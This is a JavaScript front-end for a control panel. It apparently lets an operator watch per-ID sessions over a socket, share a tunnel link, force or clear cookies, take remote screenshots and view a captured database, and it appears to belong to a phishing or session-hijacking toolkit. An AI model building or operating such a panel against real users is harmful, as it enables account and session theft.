let responseBtn = document.querySelector("#response-btn")
let responseContainer = document.querySelector(".response-container")
let responseSetter = document.querySelector("#response-setter")
let databaseBtn = document.querySelector("#database-btn")
let databaseContainer = document.querySelector(".database-container")
let openBrowserBtn = document.querySelector("#open-browser-btn")
let miniLogContainer = document.querySelector("#mini-log-container")
let terminalInput = document.querySelector(".terminal-box")
let forceCookies = document.querySelector("#force-cookies")
let clearCookies = document.querySelector("#clear-cookies")
let takeScreenshot = document.querySelector("#take-screenshot")
let screenshotContainer = document.querySelector(".screenshot-container")


socket.on(ID, (data) => {
    terminalBox(data.type, data.data, data.description)
})

// adding url to the terminal
{
    terminalBox(0, {
        server: `${location.origin}/ws-app/${appName}/${ID}`
    }, "SERVER URL")

    axios.get("/tunnel").then(res => {
        const tunnelLocation = new URL(res.data)
        terminalBox(0, {
            tunnel: `${tunnelLocation.origin}/ws-app/${appName}/${ID}`
        }, "TUNNEL URL")
    }).catch(err => {
        console.log(err)
    })
}

document.querySelectorAll(".dialog .head .fa-xmark").forEach(btn => {
    btn.parentElement.addEventListener("click", () => {
        btn.parentElement.parentElement.parentElement.parentElement.classList.remove("active")
    })
})

responseBtn.addEventListener("click", () => {
    responseContainer.classList.add("active")
})

responseSetter.addEventListener("click", async () => {
    try {
        const data = document.querySelector("#response-input").value
        const response = await axios.post(`/panel/response?id=${ID}`, {
            data
        }, {
            "Content-Type": "application/json"
        })

        if (response.data == "OK") {
            responseContainer.classList.remove("active")
        } else {
            alert(response.data)
        }
    } catch (error) {
        alert(error.message)
    }
})

databaseBtn.addEventListener("click", async () => {
    try {
        const response = await axios.get(`/panel/database?id=${ID}`)

        if (response.data && typeof response.data == "object") {
            let html = ""
            for (let obj of response.data) {
                html += terminalTable(obj)
            }

            databaseContainer.querySelector(".content").innerHTML = html
            databaseContainer.classList.add("active")
        } else {
            alert("database fetch error")
        }
    } catch (error) {
        alert(error.message)
    }
})

openBrowserBtn.addEventListener("click", async () => {
    try {
        const response = await axios.get(`/panel/browser?id=${ID}&appName=${appName}`)

        if (response.data == "OK") {
            alert(`${ID} opening browser`)
        } else {
            alert(response.data)
        }
    } catch (error) {
        alert(error.message)
    }
})

forceCookies.addEventListener('click', async () => {
    if (confirm("do you want to force cookies?")) {
        try {
            const response = await axios.get(`/panel/force-cookies?id=${ID}&appName=${appName}`)
            alert(response.data)
        } catch (error) {
            alert(error.message)
        }
    }
})

clearCookies.addEventListener("click", async () => {
    if (confirm("do you want to clear cookies?")) {
        try {
            const response = await axios.get(`/panel/clear-cookies?id=${ID}`)
            alert(response.data)
            location.reload()
        } catch (error) {
            alert(error.message)
        }
    }
})

takeScreenshot.addEventListener('click', async () => {
    try {
        const response = await axios.get(`/panel/take-screenshot?id=${ID}`)
        const data = response.data

        if (data.includes(";base64,")) {
            screenshotContainer.classList.add('active')
            screenshotContainer.querySelector("img").src = data
        } else {
            alert(data)
        }
    } catch (error) {
        alert(error.message)
    }
})

function addMiniLog(type, refId, data) {
    const date = new Date()
    const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    const a = document.createElement("a")

    if (type == 1) {
        a.className = "err"
    } else if (type == 0) {
        a.className = "ok"
    } else if (type == 2) {
        a.className = "head"
    }
    a.href = `#${refId}`
    a.innerHTML = `<span>[${time}]</span> ${data}`

    miniLogContainer.appendChild(a)
    miniLogContainer.scrollTop = miniLogContainer.scrollHeight
}

function terminalBox(type, data, description = "") {
    let value = ""
    const refId = randomString(10)
    let reftag = `<b id="${refId}"></b>`
    addMiniLog(type, refId, description)

    if (type == 1) {
        value = `${reftag}<pre class="err"><span>$</span> ${description}</pre>${terminalTable(data)}`
    } else if (type == 0) {
        value = `${reftag}<pre class="ok"><span>$</span> ${description}</pre>${terminalTable(data)}`
    } else if (type == 2) {
        value = `${reftag}<pre class="head"><span>$</span> ${description}</pre>${terminalTable(data)}`
    } else {
        value = `${reftag}<pre><span>$</span> ${description}</pre>${terminalTable(data)}`
    }

    terminalInput.innerHTML += value
    terminalInput.scrollTop = terminalInput.scrollHeight
}

function terminalTable(data) {
    let html = ""

    for (let key in data) {
        if (typeof data[key] === "object") {
            let liTags = ''

            for (let b in data[key]) {
                liTags += `<li>${b} : ${data[key][b]}</li>`
            }

            html += `
            <tr>
                <th>${key}</th>
                <td>${liTags}</td>
            </tr>`
        } else {
            html += `<tr>
            <th>${key}</th>
            <td>${data[key]}</td>
            </tr>`
        }
    }

    return `<table>${html}</table>`
}